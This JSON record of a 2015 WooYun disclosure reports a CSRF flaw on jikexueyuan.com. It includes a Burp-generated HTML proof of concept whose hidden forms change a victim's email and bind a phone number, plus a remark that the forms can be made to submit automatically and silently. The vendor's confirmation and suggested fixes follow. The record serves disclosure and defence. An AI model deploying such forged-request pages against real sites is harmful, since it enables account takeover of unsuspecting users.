{"id": 70576, "wybug_id": "wooyun-2015-0135307", "wybug_title": "极客学院某处CSRF", "wybug_corp": "jikexueyuan.com", "wybug_author": "Security", "wybug_date": "2015-08-19 15:06", "wybug_open_date": "2015-10-03 15:14", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-03：\t细节向公众公开  简要描述： 极客学院IT在线教育平台-中国最大的IT职业在线教育平台------------------------------------------- 详细说明：  说明：如果用户邮箱和手机都验证过，那么此漏洞不成立，如果其中一个没有验证，那么此漏洞成立。故评价：中危漏洞1、首先账号在未验证邮箱的情况下，我们可以随意修改邮箱地址。\n\n2、用burp抓取修改邮箱的请求消息，然后，找到历史记录，在有changEmail的链接上右击依次选择1.2.3。将自动构造CSRF POC\n\n\n用burp生成的代码如下：<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <title>极客学院CSRF</title>  <body>    <form action=\"http://www.jikexueyuan.com/member/changeEmail\">      <input type=\"hidden\" name=\"email\" value=\"138oo138o00@sina.com\" />      <input type=\"submit\" value=\"修改邮箱\" />    </form>    <form action=\"http://www.jikexueyuan.com/member/sendemail\">      <input type=\"hidden\" name=\"email\" value=\"138oo138o00@sina.com\" />      <input type=\"submit\" value=\"验证邮箱\" />    </form>    <form action=\"http://www.jikexueyuan.com/member/sendPhoneMsg\">      <input type=\"hidden\" name=\"phoneNumber\" value=\"13800138000\" />      <input type=\"submit\" value=\"绑定手机\" />    </form>  </body></html>\n当点击修改邮箱按钮之后（当然，也可以设置为自动提交，并且在网页上不输出信息，这样更隐蔽），邮箱就被修改为138oo138o00@sina.com\n\n3、修改完邮箱，之后就是发送验证邮箱的邮件了。方法同2，当点击验证邮箱时，将发送验证链接到sina邮箱。\n\n点击之后，成功激活邮箱。因为邮箱绑定之后是无法更换的，所以还是有危害的，不是吗？4、绑定手机同理，方法和上面操作一样。   漏洞证明：  \n\n还有：验证邮件的发送次数和频率要有限制。   修复方案：  加令牌：在页面添加token。验来自：判断是不是当前网站发出的请求。输密码：在有设计到关键操作的时候，让用户重新输入密码。   版权声明：转载请注明来源 Security@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-19 15:14 厂商回复： 确认，感谢~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}